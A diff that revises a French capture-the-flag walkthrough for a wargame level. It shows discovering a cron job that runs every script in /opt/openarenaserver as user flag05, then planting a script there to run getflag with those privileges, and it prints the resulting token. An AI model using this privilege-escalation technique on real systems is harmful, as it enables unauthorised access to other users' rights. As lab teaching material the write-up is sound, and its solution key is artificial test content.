@@ -1,48 +1,60 @@
-$ ls -la
-rien
+	$ ls -A
 
-$ find / -user level05 2> /dev/null 
-rien
+Rien
 
-$ find / -user flag05 2> /dev/null |
-/usr/sbin/openarenaserver
-/rofs/usr/sbin/openarenaserver
+	$ find / -user level05 2> /dev/null 
 
-$ ls -l /usr/sbin/openarenaserver; ls -l /rofs/usr/sbin/openarenaserver
--rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
--rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
+Nada
 
-$ cat /usr/sbin/openarenaserver
-#!/bin/sh
+	$ find / -user flag05  -exec ls -l {} \; 2> /dev/null
 
-for i in /opt/openarenaserver/* ; do
-	(ulimit -t 5; bash -x "$i")
-	rm -f "$i"
-done
+	-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+	-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
 
-le code nous dit :
-- boucle sur tous les fichiers de /opt/openarenaserver/ 
-- set le limite de temps CPU a 5 secondes
-- execute le fichier en cours
-- supprime le 
+	$ cat /usr/sbin/openarenaserver
 
-on peut creer des fichiers dans /opt/openarenaserver/ on me peux cependant pas l'executer nous meme:
-$ echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
+	#!/bin/sh
+	for i in /opt/openarenaserver/* ; do
+		(ulimit -t 5; bash -x "$i")
+		rm -f "$i"
+	done
 
-$ /usr/sbin/openarenaserver
-bash: /usr/sbin/openarenaserver: Permission denied
+Le code :
+- Boucle sur tous les fichiers de /opt/openarenaserver/ 
+- Set une limite de temps CPU a 5 secondes
+- Éxécute le fichier en cours
+- Supprime le fichier
 
-Neanmoins en executant les commandes suivantes:
-$ find / -name level05 2> /dev/null 
-/var/mail/level05
-/rofs/var/mail/level05
+On peut creer des scripts dans /opt/openarenaserver/ afin qu'ils soient éxécutés par openarenaserver
+On va créer un script qui va éxécuter getflag et stocker le résultat dans un fichier.
+On place ce script dans /opt/openarenaserver afin qu'il soit éxécuté par openarenaserver
 
-$ cat /var/mail/level05
-*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+	$ echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
 
-on apprends qu un cron execute le script automatiquement toutes les deux minutes:
+Malheureusement on ne peut pas éxécuter openarenaserver 
 
-On recommance et on attends:
-$ echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
-$ cat /tmp/flag05
+	$ /usr/sbin/openarenaserver
+
+	bash: /usr/sbin/openarenaserver: Permission denied
+
+Cherchons des fichiers qui dont le nom contient "level05" ?
+
+	$ find / -name level05 2> /dev/null 
+
+	/var/mail/level05
+	/rofs/var/mail/level05
+
+	$ cat /var/mail/level05
+
+	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+Il semblerait qu'un cron éxecute le script automatiquement toutes les deux minutes.
+On recommence et on attend deux minutes :
+
+	$ echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05 && \
+ 		sleep 2m 1s && \
+ 		cat /tmp/flag05
+
 Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+Bingo
